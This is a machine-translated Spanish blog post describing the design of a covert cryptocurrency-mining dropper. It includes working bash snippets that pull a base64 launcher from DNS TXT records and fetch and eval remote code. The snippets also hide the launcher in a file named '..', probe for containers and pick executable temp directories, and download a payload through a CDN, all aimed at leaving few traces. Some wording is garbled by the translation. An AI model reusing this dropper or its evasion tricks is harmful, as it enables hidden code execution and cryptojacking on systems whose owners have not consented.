New;font-weight:700;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.author__avatar>img{width:4em;height:4em;border-radius:50%;-o-object-fit:cover;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .ham,#site-nav .vert{display:none}.author__avatar{-o-object-fit:contain;object-fit:contain;float:left}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}.author__wrap .author__avatar{float:left}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%!important}.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;padding-left:3rem}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content{padding-top:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:0;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:Courier New;font-weight:700;font-size:1.5rem}.lunrSearchForm .search-button{color:var(--alt);background:0 0;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1}@media (min-width:680px) and (max-width:1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham{outline:0}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:0 0;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0;overflow:hidden;filter:blur(1rem)}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;padding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width:680px){.lang-link{height:3rem}.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}.masthead,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}}.lunrSearchForm{margin-top:1em}@media (max-width:480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}.masthead{height:34rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width:480px) and (max-width:680px){.masthead{height:20rem}}@media (max-width:680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}}@-webkit-keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@-webkit-keyframes cursor{75%{border-color:transparent}}@keyframes cursor{75%{border-color:transparent}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:VT323,monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:5.52s linear 1s forwards chars,1s 3 cursor;animation:5.52s linear 1s forwards chars,1s 3 cursor}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px}.hvr-outline-in{display:inline-block;vertical-align:middle;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transform-style:preserve-3d}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-es{background-position:-224px -33px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-za{background-position:-256px -154px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-pl{background-position:-176px -110px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-in{background-position:-64px -66px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-se{background-position:-208px -121px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-cn{background-position:-176px -22px}</style><link as=style href=/css/bundle.css rel=preload><noscript><link href=/css/bundle.css rel=stylesheet></noscript><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Crónicas de un gotero de criptonota</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/es/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/es/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-12-07T18:56:24.961","inLanguage":"es","name":"","mainEntityOfPage":{"@id":"/es/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/es/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/es/posts/><i class="fas fa-pen menu-icons"></i> publicaciones</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/es/media/><i class="fas fa-tv menu-icons"></i> medios de comunicación</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/es/posts/><i class="fas fa-pen menu-icons"></i> publicaciones</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/es/media/><i class="fas fa-tv menu-icons"></i> medios de comunicación</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/es/posts/chronichles_of_a_cryptonote_dropper> Crónicas de un gotero de criptonota</a></h1><blockquote id=page-description style=font-style:italic>... ¿Hasta dónde estás dispuesto a llegar por ... centavos?</blockquote></div><div class=franklin-content><p>Asume que quieres la mía<a href=https://en.wikipedia.org/wiki/Cryptocurrency> CRIPTOMONEDAS</a> en remoto<em> virtual</em> hardware. Necesitas encontrar algo para el mío. Servidores remotos significa que no<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> o algoritmos de prueba de trabajo de GPU, básicamente solo<a href=\posts/a-few-notes-on-proof-of-work> Monedas amigables con la CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> El software</a></h2><p>Busca y encuentra un<a href=https://github.com/xmrig/xmrig> minero</a> , pero no es realmente agradable, le gustaría algo que pueda controlar mejor desde el control remoto, así que encuentra<a href=https://github.com/Bendr0id/xmrigCC> otro minero</a> . También quieres un<a href=https://github.com/Bendr0id/xmrigcc-proxy> apoderado</a> , debido a que muchas conexiones serán de corta duración, no querrás<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> su grupo de minería. También una<a href=https://github.com/search?q=tunnel> túnel</a> sería bueno.<h2 id=the_design><a class=header-anchor href=#the_design> El diseño</a></h2><p>Algunas redes de bots utilizan datos de blockchains para buscar comandos,<a href=https://twitter.com/sarahjamielewis> alguien</a> también parece tener<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> apuestas perdidas</a> sobre que esto no vuelva a suceder ... de todos modos no somos tan sofisticados, nos las arreglaremos con algunos registros DNS que almacenan un script que extrae la carga útil que se extrae automáticamente en un directorio temporal, se ejecuta y sale<em> casi</em> no hay rastros de su configuración. Aquí hay un pequeño diagrama de flujo que muestra la estructura.<h2 id=launcher><a class=header-anchor href=#launcher> Lanzacohetes</a></h2><p>El objetivo de una secuencia de comandos de inicio es ser accesible y fácilmente actualizable de manera que resista la prueba del tiempo. Actualizando<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a>Los registros son fáciles, y el DNS es lo último que se apaga dentro de una red ... porque las direcciones IP son difíciles de recordar ... por lo que es probable que esté disponible la mayoría de las veces. Ves cuando estamos<em> obteniendo el script de implementación</em> en realidad ya estamos ejecutando algo de lógica, este es el script de inicio, necesita la capacidad de realizar consultas de DNS para buscar nuestros registros, DNS puede ser ubicuo pero<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> cavar</a> no es.<p>Hay un pequeño enigma aquí, si tenemos que descargar otra herramienta<em> para descargar otro script para descargar la carga útil</em> ¡Deberíamos descargar la carga útil! En defensa ... hacer este baile de scripty se suma a la ofuscación, permite mantener solo una implementación del lanzador (mantenibilidad, yay), no es necesario la mayoría de las veces ... así que también damos servicio a un<a href=https://en.wikipedia.org/wiki/Standalone_program> vinculado estáticamente</a> dig ejecutable para realizar consultas de dns, obtenido por autohospedaje o alojamiento en la nube (sí, hay alternativas, como 3 o 4, porque los servicios en la nube tienen un ancho de banda libre mínimo y también requieren cookies o tokens de acceso ... son muy scripts hostil, a propósito, por supuesto).<p>¿Qué hay en los registros dns? Estamos usando<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> registros, en un dominio personalizado (aquí también hay alternativas). ¿Por qué TXT? resultan ser los que pueden almacenar la mayor cantidad de datos ... por lo general, ya que es una especie de<a href=https://www.ietf.org/rfc/rfc6763.txt> recomendado</a> Dependiendo de<em> cosas</em> . Estamos usando específicamente<a href=https://www.cloudflare.com/> nube</a> para nuestro DNS, ya que es gratis y prácticamente el único jugador en la ciudad (<em> bueno, no realmente, pero cualquier otra alternativa palidece las características sabias</em> ). Sucede que puede almacenar varios datos en el<em> mismo</em>grabar ... esto comienza a ser confuso y lucha por algunas especificaciones ... (tangente) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> solía hacerlo</a> permitir<em> encadenado</em> Los registros TXT totalizan ~ 9k bytes, los documentos ahora indican ~ 2k bytes, antes del cambio estaba usando ~ 6k, creo, y estaba sirviendo el script sin comprimir, después de eso tuve que diluir el script y comprimirlo de antemano (en realidad traté de usar un<a href=https://freedns.afraid.org/> liberados</a> ( final de la tangente).<p>¿Cómo lo almacenamos? Los registros TXT solo admiten cadenas alfanuméricas, no<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , por lo que tenemos que envolverlo en una codificación no nula,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> satisface esta restricción, y porque estamos almacenando<em> encadenado</em> Registros TXT, tenemos que fragmentar la salida, ya que estamos usando material de shell, esto se hace a través del<code>-w</code> flag, en busybox, dicha bandera solía estar ausente (u optar por participar) en versiones anteriores, lo cual era molesto, una alternativa es usar el codificador incluido con openssl,<code>openssl enc -base64</code>.<p>Ahora que sabemos cómo almacenar nuestro script de implementación, lo almacenamos con<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> o manualmente. ¿Cómo lo sacamos? Mencionamos que necesitamos bindutils o las nuestras<code>dig</code> ... después de haber elegido el punto final de servicio, queremos descargarlo, lo que está disponible suele ser<a href=https://www.gnu.org/software/wget/> wget</a> o<a href=https://curl.se/> rizo</a> , wget se encuentra preinstalado con mucha más frecuencia, sin embargo, busybox solo proporciona soporte tls con bibliotecas dinámicas, por lo que debe asegurarse de que el punto final esté sirviendo http o su utilidad<code>wget</code> de gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Significa intentar<code>-t2</code>tiempos de espera<code>-T10</code> segundos siendo<code>-q</code> lectura tranquila de<code>-i-</code> stdin<code>$digurl</code> ) y escribiendo a<code>-O-</code> stdout<code>$filename</code> ). Este comando no revela lo que estamos descargando a primera vista. Vamos a tener mucho cuidado con otros comandos de shell por la misma razón, o si nos quedamos con shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> intento</a> ) incorporados siempre que sea posible. También tenga cuidado de dónde está descargando sus ejecutables, quiere asegurarse de poder ejecutarlos, ya que algunos puntos de montaje, especialmente en contenedores y<code>tmp</code> los caminos son<code>noexec</code> . Ahora que tenemos nuestra herramienta de consulta de dns, recuperamos nuestros registros<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +<span class=hljs-built_in>timeout</span>=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Las banderas se explican por sí mismas aquí,<code>+short</code> solo significa que solo estamos interesados ​​en los datos en sí, por lo que no tenemos que analizar la salida. Es importante especificar el servidor DNS, como google (<code>8.8.8.8</code> ) o destello de nube (<code>1.1.1.1</code> ) porque muchos entornos redirigen o proxy dns consultas a sus propios servidores dns de forma predeterminada. Después de haber obtenido el script fragmentado, tratamos con comillas y espacios en blanco para que esté listo para la decodificación.<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>¿Y si ahora nosotros<em> todavía</em> no tienes nuestro lanzador? El DNS es complicado, queremos un respaldo, configuremos un subdominio para obtener el script de inicio directamente. Antes de evaluar nuestro script queremos personalizarlo, con algunas variables, nuevamente usemos un registro TXT para almacenar una lista de variables NAME = VALUE y analizarla. También hay un respaldo para las variables, cloudflare ofrece redireccionamientos basados ​​en URL, estos redireccionamientos se sirven<em> antes de</em>el destino, por lo que no necesitamos un punto final, solo queremos configurar reglas de redireccionamiento basadas en expresiones regulares a un punto final ficticio, lo que nos interesa son los parámetros de la URL<code>?NAME=VALUE&NAME2=VALUE2...</code> , para que podamos parametrizar nuestro lanzador simplemente cambiando la URL de redireccionamiento, siempre con atención a los códigos de citación y escape<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>El wget<code>-S</code> imprime la URL de redireccionamiento que nos interesa para analizar. Teniendo los parámetros y el script, evaluamos las variables escribiéndolas sobre un archivo<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Este archivo se obtendrá mediante un script de implementación. La última parte de la secuencia de comandos de inicio es real<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolín</a> , evalúe el script dentro del proceso de shell actual, o tal vez deje que tmux lo administre si es posible.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>La secuencia de comandos del lanzador se descarga en un archivo llamado "..". Esto parece confuso porque se puede confundir con un<em> padre</em> directorio. Y no incluimos el comando de sesión, ya que permanecería en el comando de proceso, sino que iniciamos la sesión tmux de antemano y enviamos el comando fuente a través de la interfaz del terminal tmux. Relacionado con esto, a veces se llama a un ejecutable con<code>./</code> mantiene esos caracteres en el comando, por lo que es mejor agregar el<code>$PWD</code> al camino ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> La carga útil</a></h2><p>Nuestro script de implementación comienza obteniendo el<code>env.sh</code> archivo, y mantener o configurar vars como<code>STARTING_*</code> vars como<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Esto nos permite matar y reiniciar una instancia en ejecución mientras reiniciamos el entorno. Cambiemos a un directorio tmp con capacidades ejecutivas<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; <span class=hljs-keyword>do</span><span class=hljs-built_in>rm</span> -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        <span class=hljs-built_in>mkdir</span> -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Verificando si dentro de un<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> envase</a> también es útil, podemos sondear el sistema de archivos en busca de pistas<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Ahora es el momento de descargar nuestra carga útil, elegimos admitir wget y curl, ya sabemos cómo usar wget con banderas cuidadosas, para curl es un poco diferente. Tenemos que crear un archivo de configuración y anular<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>El último paso es solo extraer la carga útil<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Vale la pena mencionar el uso de un [CDN] para dar servicio a la carga útil. Aquí nuevamente cloudflare al rescate nos salva de los gastos de ancho de banda. Simplemente cambiando el nombre de nuestra carga útil comprimida con un<em> extensión de archivo</em> compatible con cloudflare ... se almacena en caché. Cloudflare no verifica los encabezados de lo que está atendiendo, tal vez porque hacerlo a esa escala es simplemente poco práctico.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Aventuras por Bashland</a></h2><p>Bash fue elegido asumiendo que es portátil, no se ve demasiado fuera de lugar y es más ubicuo en comparación con otros lenguajes de scripting como perl, ruby ​​o python. La verdad es que un binario independiente escrito en golang o lua hubiera sido mucho más fácil, con menos errores y más fácil de mantener, básicamente bash era la peor opción posible, en mi defensa, para cuando me rasqué tantas picaduras con bash , era demasiado tarde para reescribirlo, y también se estaba volviendo un poco aburrido.<p>También existía la opción de usar busybox con el indicador de tiempo de compilación para usar todos los elementos internos (como grep y sed), sin embargo, el uso de elementos internos de esta manera no permite generar trabajos (fork) y expone el demonio a posibles puntos muertos.<p>Describiré algunas funciones de bash aquí, con la lista completa disponible<a href=\assets/posts/bash_functions.txt> aquí</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Utilizar el<code>RANDOM</code> variable para obtener un número entre 97-122 correspondiente a un código de carácter, printf debería ser incorporado, no queremos bifurcar dentro de un bucle.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span><span class=hljs-built_in>mkfifo</span><span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span><span class=hljs-built_in>rm</span> -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Aproveche las canalizaciones para crear descriptores de archivos anónimos; estos no se comportan exactamente como los descriptores de archivos, pero son lo suficientemente buenos para<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
